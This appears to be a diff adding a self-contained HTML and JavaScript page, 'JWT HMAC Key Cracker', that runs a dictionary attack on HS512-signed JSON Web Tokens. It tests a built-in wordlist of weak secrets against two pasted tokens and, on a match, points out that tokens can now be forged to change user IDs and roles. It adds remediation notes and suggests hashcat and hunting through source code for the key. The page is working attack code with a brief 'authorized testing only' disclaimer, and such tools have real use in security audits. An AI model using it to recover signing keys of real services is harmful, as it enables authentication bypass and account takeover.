@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JWT HMAC Key Cracker</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            margin: 0;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: #111;
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid #333;
+        }
+        h1 {
+            color: #ff6b6b;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .token-input {
+            width: 100%;
+            background: #222;
+            border: 1px solid #444;
+            color: #00ff00;
+            padding: 10px;
+            margin: 10px 0;
+            font-family: inherit;
+            word-break: break-all;
+        }
+        button {
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            cursor: pointer;
+            border-radius: 4px;
+            font-size: 16px;
+            margin: 10px 5px;
+        }
+        button:hover {
+            background: #ff5252;
+        }
+        .results {
+            margin-top: 20px;
+            padding: 15px;
+            background: #1a1a1a;
+            border-left: 4px solid #00ff00;
+            white-space: pre-wrap;
+            font-size: 14px;
+        }
+        .success {
+            color: #4caf50;
+            font-weight: bold;
+        }
+        .error {
+            color: #f44336;
+        }
+        .info {
+            color: #2196f3;
+        }
+        .warning {
+            color: #ff9800;
+        }
+        .progress {
+            background: #333;
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+        .progress-bar {
+            background: linear-gradient(90deg, #ff6b6b, #4caf50);
+            height: 20px;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔓 JWT HMAC Key Cracker</h1>
+        
+        <div>
+            <label>Token 1:</label>
+            <input type="text" class="token-input" id="token1" 
+                   value="">
+        </div>
+        
+        <div>
+            <label>Token 2:</label>
+            <input type="text" class="token-input" id="token2" 
+                   value="">
+        </div>
+        
+        <button onclick="crackKey()">🚀 Start Key Cracking</button>
+        <button onclick="testCustomKey()">🔑 Test Custom Key</button>
+        <input type="text" id="customKey" placeholder="Enter custom key to test" style="width: 200px;">
+        
+        <div class="progress" id="progressContainer" style="display: none;">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div class="results" id="results">Ready to crack JWT signing key...</div>
+    </div>
+
+    <script>
+        async function hmacSHA512(key, message) {
+            const encoder = new TextEncoder();
+            const keyBuffer = encoder.encode(key);
+            const messageBuffer = encoder.encode(message);
+            
+            const cryptoKey = await crypto.subtle.importKey(
+                'raw', keyBuffer, { name: 'HMAC', hash: 'SHA-512' }, false, ['sign']
+            );
+            
+            const signature = await crypto.subtle.sign('HMAC', cryptoKey, messageBuffer);
+            return btoa(String.fromCharCode(...new Uint8Array(signature)))
+                .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+        }
+
+        function parseJWT(token) {
+            const parts = token.split('.');
+            return {
+                signature: parts[2],
+                headerPayload: parts[0] + '.' + parts[1]
+            };
+        }
+
+        async function testKey(key, jwt1, jwt2) {
+            try {
+                const sig1 = await hmacSHA512(key, jwt1.headerPayload);
+                const sig2 = await hmacSHA512(key, jwt2.headerPayload);
+                
+                return sig1 === jwt1.signature && sig2 === jwt2.signature;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        function updateResults(message, type = 'info') {
+            const results = document.getElementById('results');
+            const timestamp = new Date().toLocaleTimeString();
+            const className = type === 'success' ? 'success' : 
+                            type === 'error' ? 'error' : 
+                            type === 'warning' ? 'warning' : 'info';
+            
+            results.innerHTML += `<span class="${className}">[${timestamp}] ${message}</span>\n`;
+            results.scrollTop = results.scrollHeight;
+        }
+
+        function updateProgress(current, total) {
+            const progressContainer = document.getElementById('progressContainer');
+            const progressBar = document.getElementById('progressBar');
+            
+            if (total > 0) {
+                progressContainer.style.display = 'block';
+                const percentage = (current / total) * 100;
+                progressBar.style.width = percentage + '%';
+            } else {
+                progressContainer.style.display = 'none';
+            }
+        }
+
+        async function crackKey() {
+            const token1 = document.getElementById('token1').value.trim();
+            const token2 = document.getElementById('token2').value.trim();
+            
+            if (!token1 || !token2) {
+                updateResults('Please provide both JWT tokens', 'error');
+                return;
+            }
+
+            const jwt1 = parseJWT(token1);
+            const jwt2 = parseJWT(token2);
+            
+            updateResults('🔍 Starting JWT key cracking attack...', 'info');
+            updateResults(`Token 1 signature: ${jwt1.signature.substring(0, 20)}...`, 'info');
+            updateResults(`Token 2 signature: ${jwt2.signature.substring(0, 20)}...`, 'info');
+
+            // Comprehensive wordlist
+            const wordlist = [
+                // Empty and basic
+                '', ' ', 'null', 'undefined', 'none', 'default', 'test', 'demo',
+                
+                // Numbers
+                '0', '1', '12', '123', '1234', '12345', '123456', '1234567', '12345678', '123456789',
+                
+                // Common passwords
+                'password', 'secret', 'admin', 'root', 'user', 'guest', 'public', 'private',
+                
+                // JWT specific
+                'jwt', 'token', 'auth', 'bearer', 'key', 'secretkey', 'jwtkey', 'authkey',
+                'jwt-secret', 'jwt_secret', 'jwtsecret', 'JWT_SECRET', 'JWTSECRET',
+                'jwt-key', 'jwt_key', 'jwtKey', 'JWTKey', 'JWT_KEY',
+                
+                // HMAC specific
+                'hmac', 'hmackey', 'hmac-key', 'hmac_key', 'HMAC_KEY',
+                'hs512', 'hs512-key', 'hs512_key', 'HS512_KEY',
+                
+                // Application patterns
+                'app', 'api', 'server', 'client', 'web', 'mobile',
+                'app-secret', 'api-secret', 'server-secret', 'web-secret',
+                'myapp', 'myapi', 'myserver', 'webapp', 'webapi',
+                'application', 'service', 'microservice',
+                
+                // Security related
+                'security', 'secure', 'crypto', 'hash', 'sign', 'verify',
+                'session', 'login', 'logout', 'signin', 'signup', 'auth',
+                'authentication', 'authorization', 'access', 'permission',
+                
+                // Development environments
+                'dev', 'development', 'prod', 'production', 'staging', 'local',
+                'localhost', 'dev-secret', 'prod-secret', 'staging-secret',
+                
+                // Framework specific
+                'spring', 'boot', 'express', 'node', 'nodejs', 'react', 'angular',
+                'laravel', 'django', 'flask', 'rails', 'symfony', 'asp', 'dotnet',
+                
+                // Common words
+                'hello', 'world', 'welcome', 'home', 'index', 'main', 'start',
+                'qwerty', 'asdf', 'zxcv', 'qwertyuiop', 'asdfghjkl', 'zxcvbnm',
+                'letmein', 'changeme', 'please', 'thanks', 'sorry',
+                
+                // Company/project names (common)
+                'company', 'project', 'team', 'organization', 'corp',
+                'example', 'sample', 'template', 'boilerplate', 'starter',
+                
+                // Base64 common strings
+                'c2VjcmV0', 'YWRtaW4=', 'cGFzc3dvcmQ=', 'dGVzdA==',
+                
+                // Years and dates
+                '2023', '2024', '2025', '20231', '20241', '20251',
+                
+                // Keyboard patterns
+                '12345qwert', 'qwerty123', 'abc123', '123abc', 'password123',
+                'admin123', 'secret123', 'test123', 'demo123'
+            ];
+
+            let found = false;
+            let testedCount = 0;
+            const totalKeys = wordlist.length;
+
+            updateResults(`📊 Testing ${totalKeys} potential keys...`, 'info');
+
+            for (const key of wordlist) {
+                const result = await testKey(key, jwt1, jwt2);
+                testedCount++;
+                
+                if (result) {
+                    updateResults(`\n🎉 SIGNING KEY FOUND: "${key}"`, 'success');
+                    updateResults(`🔑 Key length: ${key.length} characters`, 'success');
+                    
+                    // Double verification
+                    const sig1 = await hmacSHA512(key, jwt1.headerPayload);
+                    const sig2 = await hmacSHA512(key, jwt2.headerPayload);
+                    
+                    updateResults(`✅ Token 1 verification: ${sig1 === jwt1.signature ? 'PASS' : 'FAIL'}`, 'success');
+                    updateResults(`✅ Token 2 verification: ${sig2 === jwt2.signature ? 'PASS' : 'FAIL'}`, 'success');
+                    
+                    updateResults('\n🚨 SECURITY IMPLICATIONS:', 'warning');
+                    updateResults('• You can now forge JWT tokens with any payload', 'warning');
+                    updateResults('• Modify user IDs, roles, and permissions', 'warning');
+                    updateResults('• Complete authentication bypass possible', 'warning');
+                    updateResults('• Recommend immediate key rotation', 'warning');
+                    
+                    updateResults('\n🔧 REMEDIATION:', 'info');
+                    updateResults('• Generate a cryptographically secure random key', 'info');
+                    updateResults('• Use at least 256 bits (32 bytes) for HS512', 'info');
+                    updateResults('• Store keys securely (environment variables)', 'info');
+                    updateResults('• Implement key rotation policies', 'info');
+                    
+                    found = true;
+                    updateProgress(totalKeys, totalKeys);
+                    break;
+                }
+                
+                if (testedCount % 25 === 0) {
+                    updateResults(`Progress: ${testedCount}/${totalKeys} keys tested`, 'info');
+                    updateProgress(testedCount, totalKeys);
+                }
+                
+                // Add small delay to prevent UI freezing
+                if (testedCount % 50 === 0) {
+                    await new Promise(resolve => setTimeout(resolve, 10));
+                }
+            }
+
+            if (!found) {
+                updateResults(`\n❌ Key not found in wordlist (${testedCount} keys tested)`, 'error');
+                updateResults('\n🔍 The signing key might be:', 'warning');
+                updateResults('• A longer random string (>20 characters)', 'warning');
+                updateResults('• Generated from environment variables', 'warning');
+                updateResults('• Base64/hex encoded random data', 'warning');
+                updateResults('• Application-specific pattern not in wordlist', 'warning');
+                updateResults('• Binary data or special characters', 'warning');
+                
+                updateResults('\n💡 NEXT STEPS:', 'info');
+                updateResults('• Try tools like hashcat with larger wordlists', 'info');
+                updateResults('• Analyze application source code for key generation', 'info');
+                updateResults('• Check configuration files and environment variables', 'info');
+                updateResults('• Look for key derivation patterns in the codebase', 'info');
+            }
+            
+            updateProgress(0, 0); // Hide progress bar
+        }
+
+        async function testCustomKey() {
+            const customKey = document.getElementById('customKey').value;
+            const token1 = document.getElementById('token1').value.trim();
+            const token2 = document.getElementById('token2').value.trim();
+            
+            if (!customKey) {
+                updateResults('Please enter a custom key to test', 'error');
+                return;
+            }
+            
+            if (!token1 || !token2) {
+                updateResults('Please provide both JWT tokens', 'error');
+                return;
+            }
+
+            const jwt1 = parseJWT(token1);
+            const jwt2 = parseJWT(token2);
+            
+            updateResults(`🔍 Testing custom key: "${customKey}"`, 'info');
+            
+            const result = await testKey(customKey, jwt1, jwt2);
+            
+            if (result) {
+                updateResults(`🎉 SUCCESS! Custom key "${customKey}" is valid`, 'success');
+                updateResults(`🔑 Key length: ${customKey.length} characters`, 'success');
+            } else {
+                updateResults(`❌ Custom key "${customKey}" does not match`, 'error');
+                
+                // Show what the signatures would be
+                const sig1 = await hmacSHA512(customKey, jwt1.headerPayload);
+                const sig2 = await hmacSHA512(customKey, jwt2.headerPayload);
+                
+                updateResults(`Expected signature 1: ${sig1.substring(0, 20)}...`, 'info');
+                updateResults(`Actual signature 1:   ${jwt1.signature.substring(0, 20)}...`, 'info');
+                updateResults(`Expected signature 2: ${sig2.substring(0, 20)}...`, 'info');
+                updateResults(`Actual signature 2:   ${jwt2.signature.substring(0, 20)}...`, 'info');
+            }
+        }
+
+        // Allow Enter key to trigger custom key test
+        document.getElementById('customKey').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                testCustomKey();
+            }
+        });
+
+        // Clear results on page load
+        updateResults('🔓 JWT HMAC Key Cracker Ready', 'info');
+        updateResults('Load two JWT tokens and click "Start Key Cracking"', 'info');
+        updateResults('This tool performs dictionary attacks against HMAC-signed JWTs', 'info');
+        updateResults('⚠️  For educational and authorized testing only!', 'warning');
+    </script>
+</body>
+</html>
+                
